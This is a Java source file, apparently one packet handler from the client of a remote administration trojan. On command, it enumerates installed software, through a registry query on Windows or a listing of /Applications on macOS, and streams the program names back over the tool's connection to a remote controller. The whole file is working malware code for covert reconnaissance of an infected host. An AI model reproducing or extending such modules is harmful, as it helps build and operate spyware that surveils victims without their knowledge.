package com.redpois0n.packets;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;

import com.redpois0n.Connection;
import com.redpois0n.common.os.OperatingSystem;


public class PacketLISTINSTALL extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {
		String path = Connection.readLine();
		try {
			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				Process p;
				if (path.equalsIgnoreCase("hklm")) {
					p = Runtime.getRuntime().exec(new String[] { "reg", "query", "hklm\\software\\microsoft\\windows\\currentversion\\uninstall\\", "/s" });
				} else {
					p = Runtime.getRuntime().exec(new String[] { "reg", "query", path + "\\software\\microsoft\\windows\\currentversion\\uninstall\\", "/s" });
				}
				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
				while ((line = reader.readLine()) != null) {
					line = line.trim();
					if (path.equalsIgnoreCase("hklm")) {
						if (line.startsWith("DisplayName")) {
							String str = line.split("    ")[2];
							if (!str.startsWith("@")) {
								Connection.addToSendQueue(new PacketBuilder(Header.INSTALLED_PROGRAMS, str));
							}
						}
					} else {
						if (line.lastIndexOf("\\") != -1) {
							String str = line.substring(line.lastIndexOf("\\") + 1, line.length());
							Connection.addToSendQueue(new PacketBuilder(Header.INSTALLED_PROGRAMS, str));
						}
					}
				}
				reader.close();
			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
				File[] apps = new File("/Applications/").listFiles();
				
				for (File app : apps) {
					String name = app.getName();
					
					if (name.contains(".app")) {
						name = name.replace(".app", "");
						Connection.addToSendQueue(new PacketBuilder(Header.INSTALLED_PROGRAMS, app.getName()));
					}
				}
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
